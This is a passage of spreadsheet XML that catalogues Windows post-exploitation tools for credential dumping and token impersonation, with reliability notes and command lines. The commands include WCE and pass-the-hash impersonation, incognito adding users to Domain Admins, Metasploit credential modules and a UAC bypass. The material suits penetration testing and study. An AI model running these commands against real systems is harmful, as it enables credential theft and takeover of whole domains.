            <text:p>Metasploit gather/credentials/enum_cred_store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9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Prefer netpass and Cain &amp; Abel to this Metasploit post-exploitation module. It found all entries but it dumped 2 out of 7 entries and the loot output file is not easily readable.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>run post/windows/gather/credentials/enum_cred_store</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://www.oxid.it/creddump.html&quot;;&quot;creddump by oxid.it&quot;)" office:value-type="string" office:string-value="creddump by oxid.it" calcext:value-type="string">
            <text:p>creddump by oxid.it</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes. See not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string" calcext:value-type="string">
            <text:p>Unreliable. See notes</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="9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void this tool. It crashes the lsass.exe process and the system gets restarted automatically. Use Cain &amp; Abel by the same author or netpass instead.</text:p>
            <text:p>On 64-bit architecture it fails and displays "CreateRemoteThread failed: 5".</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;creddump.exe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pspv.html&quot;;&quot;Protected Storage PassView (pspv)&quot;)" office:value-type="string" office:string-value="Protected Storage PassView (pspv)" calcext:value-type="string">
            <text:p>Protected Storage PassView (pspv)</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3" table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes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:\&gt;pspv.exe /stab pspv.txt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credentials/windows_autologin.rb&quot;; &quot;Metasploit gather/credentials/windows_autologin (post module)&quot;)" office:value-type="string" office:string-value="Metasploit gather/credentials/windows_autologin (post module)" calcext:value-type="string">
            <text:p>Metasploit gather/credentials/windows_autologin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7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un post/windows/gather/credentials/windows_autologin</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://www.ampliasecurity.com/research.html&quot;;&quot;Windows Credentials Editor (WCE)&quot;)" office:value-type="string" office:string-value="Windows Credentials Editor (WCE)" calcext:value-type="string">
            <text:p>Windows Credentials Editor (WC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style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (dump and impersonate)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ith version 1.3, WCE is also able to dump clear-text passwords for logon sessions, like mimikatz does (http://hexale.blogspot.com/2012/03/wce-v13beta-32bit-released.html).</text:p>
            <text:p>Make sure you run the 64-bit version of this tool on 64-bit architecture otherwise it won't work.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;wce.exe -l -v                                                                                       # dump available logon sessions</text:p>
            <text:p>C:\&gt;wce.exe -r3                                                                                        # dump available logon sessions every 3 secs</text:p>
            <text:p>C:\&gt;wce.exe -w                                                                                         # dump clear-text passwords for logon sessions</text:p>
            <text:p/>
            <text:p>C:\&gt;wce.exe -s &lt;user&gt;:&lt;domain&gt;:&lt;LM hash&gt;:&lt;NT hash&gt; -c cmd.exe     # impersonate a logon session</text:p>
            <text:p/>
            <text:p>C:\&gt;wce.exe -g &lt;password&gt;                                                                     # generate LM and NT hash of &lt;password&gt;</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://corelabs.coresecurity.com/index.php?module=Wiki&amp;action=view&amp;type=tool&amp;name=Pass-The-Hash_Toolkit&quot;;&quot;Pass-The-Hash Toolkit (PTH)&quot;)" office:value-type="string" office:string-value="Pass-The-Hash Toolkit (PTH)" calcext:value-type="string">
            <text:p>Pass-The-Hash Toolkit (PTH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style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (dump and impersonate)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This tool is deprecated and does not work on 64-bit architecture and recent versions of Windows. Use WCE instead.</text:p>
            <text:p>On remote logon sessions via RDP it fails and displays "Error in InjectDllAndCallFunction", run as SYSTEM to avoid this from happening.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;whosthere-alt.exe -D                                                                             # dump available logon sessions</text:p>
            <text:p>C:\&gt;iam-alt.exe -h &lt;user&gt;:&lt;domain&gt;:&lt;LM hash&gt;:&lt;NT hash&gt; -r cmd.exe    # impersonate a logon session</text:p>
            <text:p/>
            <text:p>C:\&gt;genhash.exe &lt;password&gt;                                                                     # generate LM and NT hash of &lt;password&gt;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ruesec.se/sakerhet/verktyg/saakerhet/lslsass_v1.0_(x86)&quot;;&quot;lslsass&quot;)" office:value-type="string" office:string-value="lslsass" calcext:value-type="string">
            <text:p>lslsas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style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (dump)</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"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ke sure you run the 64-bit version of this tool on 64-bit architecture otherwise no entries will be dumped.</text:p>
            <text:p>On older Windows versions use mimikatz, msvctl, WCE or PTH.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;lslsass.exe go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ruesec.com/security/tools/security/runhash_v1.0_(x86)&quot;;&quot;RunhAsh&quot;)" office:value-type="string" office:string-value="RunhAsh" calcext:value-type="string">
            <text:p>RunhAsh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style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (impersonate)</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"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ke sure you run the 64-bit version of this tool on 64-bit architecture otherwise it won't work.</text:p>
            <text:p>On older Windows versions use mimikatz, msvctl, WCE or PTH.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;runhash.exe &lt;domain&gt;\&lt;user&gt;::&lt;LM hash&gt;:&lt;NT hash&gt;::: cmd.exe</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://www.truesec.se/sakerhet/verktyg/saakerhet/msvctl_v0.3&quot;;&quot;msvctl&quot;)" office:value-type="string" office:string-value="msvctl" calcext:value-type="string">
            <text:p>msvctl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8" table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>No</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (dump and impersonate)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. See notes</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>On 64-bit architecture it fails and displays "error: code: -10". Use RunhAsh, mimikatz or WCE instead.</text:p>
            <text:p>On remote logon sessions via RDP it fails and displays "error: code: -10", run as SYSTEM to avoid this from happening.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;msvctl.exe list</text:p>
            <text:p>C:\&gt;msvctl.exe &lt;domain&gt;\&lt;user&gt; &lt;LM hash&gt;:&lt;NT hash&gt; run cmd.exe</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://sourceforge.net/projects/incognito/&quot;;&quot;incognito&quot;)" office:value-type="string" office:string-value="incognito" calcext:value-type="string">
            <text:p>incognit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9" table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>No</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (list and impersonate)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nreliable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nreliable. See not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his tool is not officially supported on 64-bit architecture and recent versions of Windows. Run it a few times to list all available tokens and impersonate properly.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>Run as an administrative user:</text:p>
            <text:p>C:\&gt;incognito.exe -h 127.0.0.1 list_tokens -u   # list available user tokens</text:p>
            <text:p>C:\&gt;incognito.exe -h 127.0.0.1 list_tokens -g   # list available group tokens</text:p>
            <text:p>C:\&gt;incognito.exe -h 127.0.0.1 execute -c "NT AUTHORITY\SYSTEM" cmd.exe # impersonate Local System</text:p>
            <text:p>C:\&gt;incognito.exe -h 127.0.0.1 add_user -h &lt;domaincontrollerip&gt; youruser yourpassword     # add a domain user</text:p>
            <text:p>C:\&gt;incognito.exe -h 127.0.0.1 add_group_user -h &lt;domaincontrollerip&gt; "Domain Admins" youruser    # assign domain admin to user</text:p>
            <text:p>C:\&gt;incognito.exe -h 127.0.0.1 add_group_user -h &lt;domaincontrollerip&gt; "Enterprise Admins" youruser # assign ent admin to user</text:p>
            <text:p>C:\&gt;incognito.exe -h 192.168.0.1 list_tokens -u # remote, list available user tokens</text:p>
            <text:p>C:\&gt;incognito.exe -h 192.168.0.1 list_tokens -g # remote, list available group tokens</text:p>
            <text:p>C:\&gt;incognito.exe -h 192.168.0.1 execute -c "NT AUTHORITY\SYSTEM" cmd.exe # impersonate Local System</text:p>
            <text:p>C:\&gt;incognito.exe -h 192.168.0.1 add_user -h &lt;domaincontrollerip&gt; &lt;user&gt; &lt;password&gt;     # remote, add a domain user</text:p>
            <text:p>C:\&gt;incognito.exe -h 192.168.0.1 add_group_user -h &lt;domaincontrollerip&gt; "Domain Admins" &lt;user&gt;    # remote, assign domain admin to user</text:p>
            <text:p>C:\&gt;incognito.exe -h 192.168.0.1 add_group_user -h &lt;domaincontrollerip&gt; "Enterprise Admins" &lt;user&gt; # remote, assign ent admin to user</text:p>
            <text:p/>
            <text:p>Run as SYSTEM (psexec.exe -s cmd.exe):</text:p>
            <text:p>C:\&gt;incognito.exe list_tokens -u   # list available user tokens</text:p>
            <text:p>C:\&gt;incognito.exe list_tokens -g   # list available group tokens</text:p>
            <text:p>C:\&gt;incognito.exe execute -c "&lt;domain|workgroup&gt;\user" cmd.exe # impersonate a &lt;domain|workgroup&gt; user</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://sourceforge.net/projects/incognito/&quot;;&quot;find_token&quot;)" office:value-type="string" office:string-value="find_token" calcext:value-type="string">
            <text:p>find_token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9" table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>No</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (list)</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="4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nreliable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nreliable. See not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his tool is not officially supported on 64-bit architecture and recent versions of Windows. Run it a few times to list all available tokens.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>Run as an administrator user:</text:p>
            <text:p>C:\&gt;find_token.exe 127.0.0.1</text:p>
            <text:p>C:\&gt;find_token.exe 192.168.0.1                                                         # remote, one IP</text:p>
            <text:p>C:\&gt;find_token.exe -f ips.txt                                                               # remote, IP list</text:p>
            <text:p>C:\&gt;find_token.exe 192.168.0.1 Administrator &lt;password&gt;               # remote, one IP</text:p>
            <text:p>C:\&gt;find_token.exe -f ips.txt Administrator &lt;password&gt;                     # remote, IP list</text:p>
            <text:p/>
            <text:p>Run as SYSTEM (psexec.exe -s cmd.exe):</text:p>
            <text:p>C:\&gt;find_token.exe 127.0.0.1</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://www.openwall.com/john/contrib/cachedump-1.2.zip&quot;;&quot;cachedump&quot;)" office:value-type="string" office:string-value="cachedump" calcext:value-type="string">
            <text:p>cache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No</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (in-memory)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. See not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 (?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n 64-bit architecture it fails and displays "ERROR Unable to LoadLibrary lsasrv.dll (code 126)".</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;cachedump.exe -v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cachedump.rb&quot;;&quot;Metasploit gather/cachedump (post module)&quot;)" office:value-type="string" office:string-value="Metasploit gather/cachedump (post module)" calcext:value-type="string">
            <text:p>Metasploit gather/cachedump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" table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>No</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes (from registry files)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un post/windows/gather/cachedump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wireless_key.html&quot;;&quot;WirelessKeyView&quot;)" office:value-type="string" office:string-value="WirelessKeyView" calcext:value-type="string">
            <text:p>WirelessKeyView</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3" table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1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. See not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ke sure you run the 64-bit version of this tool on 64-bit architecture otherwise no entries will be dumped.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>C:\&gt;WirelessKeyView.exe /codeinject 1 /stab WirelessKeyView_tab.txt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wlan/wlan_profile.rb&quot;;&quot;Metasploit wlan/wlan_profile (post module)&quot;)" office:value-type="string" office:string-value="Metasploit wlan/wlan_profile (post module)" calcext:value-type="string">
            <text:p>Metasploit wlan/wlan_profile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un post/windows/escalate/bypassuac </text:p>
            <text:p>Background session &lt;X&gt;? [y/N]  y</text:p>
            <text:p>msf  exploit(handler) &gt; sessions -l</text:p>
            <text:p>msf  exploit(handler) &gt; sessions -i &lt;X&gt;+1    # these steps are recommended against Windows Vista and Windows 7 to dump the clear-text wireless password/passphrase</text:p>
            <text:p>run post/windows/wlan/wlan_profile</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://www.cqure.net/wp/vncpwdump/&quot;;&quot;vncpwdump&quot;)" office:value-type="string" office:string-value="vncpwdump" calcext:value-type="string">
            <text:p>vncpwdum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:\&gt;vncpwdump.exe -c -s -d</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;http://www.nirsoft.net/utils/vnc_password.html&quot;;&quot;VNCPassView&quot;)" office:value-type="string" office:string-value="VNCPassView" calcext:value-type="string">
            <text:p>VNCPassView</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3" table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Yes</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="13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:\&gt;VNCPassView.exe /stab vncpassview.txt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modules/post/windows/gather/credentials/vnc.rb&quot;;&quot;Metasploit gather/vnc (post module)&quot;)" office:value-type="string" office:string-value="Metasploit gather/vnc (post module)" calcext:value-type="string">
            <text:p>Metasploit gather/vnc (post module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un post/windows/gather/credentials/vnc</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce2" table:formula="of:=HYPERLINK(&quot;https://github.com/rapid7/metasploit-framework/blob/master/scripts/meterpreter/getvncpw.rb&quot;;&quot;Metasploit getvncpw (script)&quot;)" office:value-type="string" office:string-value="Metasploit getvncpw (script)" calcext:value-type="string">
            <text:p>Metasploit getvncpw (script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4"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un getvncpw</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="998"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce3" table:number-columns-repeated="23"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table:formula="of:=HYPERLINK(&quot;http://bernardodamele.blogspot.com&quot;;&quot;by Bernardo Damele A. G.&quot;)" office:value-type="string" office:string-value="by Bernardo Damele A. G." calcext:value-type="string">
            <text:p>by Bernardo Damele A. G.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce6" table:number-columns-repeated="22"/>
          <table:table-cell table:style-name="ce9" table:number-columns-repeated="3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://bernardodamele.blogspot.com/search/label/dump" xlink:type="simple">http://bernardodamele.blogspot.com/search/label/dump</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce6" table:number-columns-repeated="22"/>
          <table:table-cell table:style-name="ce9" table:number-columns-repeated="3"/>
          <table:table-cell table:number-columns-repeated="99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ols.A1:Tools.Z51">
            <calcext:condition calcext:apply-style-name="ConditionalStyle_1" calcext:value="contains-text(&quot;(~?)&quot;)" calcext:base-cell-address="Tools.A1"/>
          </calcext:conditional-format>
          <calcext:conditional-format calcext:target-range-address="Tools.A1:Tools.Z51">
            <calcext:condition calcext:apply-style-name="ConditionalStyle_2" calcext:value="=&quot;No&quot;" calcext:base-cell-address="Tools.A1"/>
          </calcext:conditional-format>
          <calcext:conditional-format calcext:target-range-address="Tools.A1:Tools.Z51">
            <calcext:condition calcext:apply-style-name="ConditionalStyle_3" calcext:value="contains-text(&quot;Yes&quot;)" calcext:base-cell-address="Tools.A1"/>
          </calcext:conditional-format>
          <calcext:conditional-format calcext:target-range-address="Tools.A1:Tools.Z51">
            <calcext:condition calcext:apply-style-name="ConditionalStyle_4" calcext:value="contains-text(&quot;Unreliable&quot;)" calcext:base-cell-address="Tools.A1"/>
          </calcext:conditional-format>
          <calcext:conditional-format calcext:target-range-address="Tools.A1:Tools.Z51">
            <calcext:condition calcext:apply-style-name="ConditionalStyle_2" calcext:value="contains-text(&quot;No.&quot;)" calcext:base-cell-address="Tool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3c47d"/>
    </style:style>
    <style:style style:name="ConditionalStyle_5f_4" style:display-name="ConditionalStyle_4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0" meta:object-count="0"/>
    <meta:generator>LibreOfficeDev/5.1.0.3$Linux_X86_64 LibreOffice_project/</meta:generator>
  </office:meta>
</office:document-meta>
</file>